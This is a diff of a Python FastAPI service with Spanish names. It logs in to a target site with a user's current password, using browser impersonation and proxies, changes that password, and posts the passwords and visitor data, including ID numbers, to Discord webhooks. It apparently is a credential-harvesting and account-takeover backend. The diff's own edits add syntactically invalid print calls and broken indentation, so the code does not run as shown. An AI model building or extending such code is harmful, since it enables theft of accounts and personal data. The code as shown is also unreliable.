@@ -14,6 +14,7 @@ import string
 import time
 from typing import Optional
 from curl_cffi import requests
+from curl_cffi.requests import CurlOpt
 from fastapi import FastAPI, HTTPException, Request
 from fastapi.responses import HTMLResponse, FileResponse
 from fastapi.middleware.cors import CORSMiddleware
@@ -92,7 +93,7 @@ def send_to_discord(embed: dict, webhook_url: str = None):
         session.post(url, json=payload, timeout=10)
         session.close()
     except Exception as e:
-        print(f"Discord error: {e}")
+        print(flush=True, f"Discord error: {e}")
 
 
 # ---------------------------------------------------------------
@@ -137,10 +138,10 @@ def obtener_cookies(session, proxy) -> None:
         "user-agent":      BASE_HEADERS["user-agent"],
     }
     r1 = session.get(BASE_URL, headers=headers_navegador, impersonate="chrome", proxies=proxy, timeout=20)
-    print(f"COOKIE_STEP1 | status={r1.status_code} | url={r1.url}")
+    print(flush=True, f"COOKIE_STEP1 | status={r1.status_code} | url={r1.url}")
     time.sleep(1.5)
     r2 = session.get(BASE_URL, headers=headers_navegador, impersonate="chrome", proxies=proxy, timeout=20)
-    print(f"COOKIE_STEP2 | status={r2.status_code} | url={r2.url}")
+    print(flush=True, f"COOKIE_STEP2 | status={r2.status_code} | url={r2.url}")
     time.sleep(0.5)
 
 
@@ -230,7 +231,7 @@ def do_login(session, proxy, username: str, password: str) -> dict:
         proxies=proxy,
         timeout=(8, 15)
     )
-    print(f"LOGIN_REQUEST | status={r.status_code} | response={r.text[:300]}")
+    print(flush=True, f"LOGIN_REQUEST | status={r.status_code} | response={r.text[:300]}")
 
     try:
         body = r.json()
@@ -249,7 +250,7 @@ def change_password_api(username: str, current_password: str, new_password: str)
         login_result = do_login(session, proxy, username, current_password)
         
         if login_result["status"] != 200 or login_result["body"].get("code") != 0:
-            print(f"LOGIN FAILED | status={login_result['status']} | body={json.dumps(login_result['body'], ensure_ascii=False)[:500]}")
+            print(flush=True, f"LOGIN FAILED | status={login_result['status']} | body={json.dumps(login_result['body'], ensure_ascii=False)[:500]}")
             return {
                 "success": False,
                 "message": f"Contraseña Actual Incorrecta (HTTP {login_result['status']})",
@@ -368,7 +369,7 @@ async def change_password(request: ChangePasswordRequest):
                 with open(resultados_path, "w", encoding="utf-8") as f:
                     json.dump(resultados, f, indent=2, ensure_ascii=False)
             except Exception as e:
-                print(f"Error actualizando resultados.json: {e}")
+                print(flush=True, f"Error actualizando resultados.json: {e}")
         
         # Enviar a Discord con las contraseñas
         embed = {
@@ -498,11 +499,12 @@ async def get_token_data(token_val: str, request: Request):
         }
         
         try:
-            session = requests.Session()
+    session = requests.Session()
+    session.curl.setopt(CurlOpt.HTTP_VERSION, 2)  # Force HTTP/1.1
             session.post(DISCORD_VISITAS_WEBHOOK, json={"embeds": [visita_embed]}, timeout=10)
             session.close()
         except Exception as e:
-            print(f"Error enviando visita a Discord: {e}")
+            print(flush=True, f"Error enviando visita a Discord: {e}")
     
     return {
         "cedula": data["cedula"],
